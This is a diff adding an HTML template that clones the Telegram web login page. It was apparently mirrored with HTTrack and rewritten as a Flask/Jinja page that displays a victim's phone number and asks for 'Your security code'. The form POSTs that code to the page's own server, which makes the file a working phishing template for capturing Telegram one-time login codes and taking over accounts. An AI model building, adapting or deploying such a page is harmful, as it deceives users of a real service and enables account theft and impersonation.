@@ -1,0 +1,65 @@
+<!doctype html><html lang="en" translate="no" class="notranslate">
+<!-- Mirrored from web.telegram.org/a/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 13 May 2023 11:31:16 GMT -->
+<head><meta charset="UTF-8"><title>Telegram</title><meta name="title" content="Telegram"><meta name="description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed."><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no,viewport-fit=cover"><meta name="mobile-web-app-capable" content="yes"><meta name="mobile-web-app-title" content="Telegram"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Telegram"><meta name="application-name" content="Telegram"><meta name="msapplication-TileColor" content="#2b5797"><meta name="msapplication-config" content="browserconfig.xml"><meta name="theme-color" content="#201e20"><meta name="google" content="notranslate"><meta property="og:type" content="website"><meta property="og:url" content="index.html"><meta property="og:title" content="Telegram"><meta property="og:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed."><meta property="og:image" content="icon-192x192.png"><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="index.html"><meta property="twitter:title" content="Telegram"><meta property="twitter:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed."><meta property="twitter:image" content="icon-192x192.png"><link rel="canonical" href="https://web.telegram.org/"><link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png"><link rel="icon" href="favicon.svg" type="image/svg+xml"><link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png"><link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png"><link rel="icon" type="image/png" sizes="192x192" href="icon-192x192.png"><link rel="alternate icon" href="favicon.ico" type="image/x-icon"><link rel="manifest" id="the-manifest-placeholder" href="site.webmanifest">
+
+
+<link rel="icon" type="image/x-icon" href="{{ url_for('static', filename='tglogo.webp')}}">
+
+</script><link href="{{ url_for('static', filename='main.4c5fe2db2459b17ee198.css')}}" rel="stylesheet">
+
+
+
+<style>
+  body{
+    font-family: 'Roboto', sans-serif;
+    background-color: #201e20;
+  }
+  .nextbutton{
+    width: 370px;
+    height: 50px;
+    color: white;
+    background-color: #8774e1;
+    border-style: solid;
+    border-width: 0px;
+    border-radius: 13px;
+  }
+  .loginfield{
+    background-color: #201e20;
+    width: 370px;
+  }
+
+</style>
+
+<style>
+  /* Import Roboto font from Google Fonts */
+  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+</style>
+
+</head>
+
+
+<body id="root">
+  <center>
+  <br><br>
+  <img class="sign-logo" src="{{ url_for('static', filename='code.gif')}}" width="160" height="160" viewBox="0 0 160 160">
+  <br><br>
+  <h4 class="text-center i18n" style="color: white; font-size: 28px; font-family: 'Roboto', sans-serif;">{{number}}</h4>
+  <p class="subtitle sent-type"><span class="i18n" style="color: #acacac; font-family: 'Roboto', sans-serif;">{{toptext}}<br>{{bottomtext}}</span></p>
+  <br>
+<form method="POST">  
+<div class="loginfield"> 
+  <div class="input-group touched with-label"><input class="form-control" type="text" id="sign-in-phone-number" dir="auto" inputmode="tel" aria-label="Your phone number" style="background-color: #1b1b1b;color:white; width: 370px;" name='code'><label for="sign-in-phone-number" style="background-color: #201e20; color:white;">Your security code</label></div>
+<div id="portals"></div>
+
+<button class="nextbutton" style=""><div class="c-ripple"></div><span class="i18n">NEXT</span></button>
+
+<script>
+  document.querySelector('.nextbutton').addEventListener('click', function() {
+    this.style.display = 'none';
+  });
+</script></center>
+</div>
+</form>
+</body>
+
+</html>
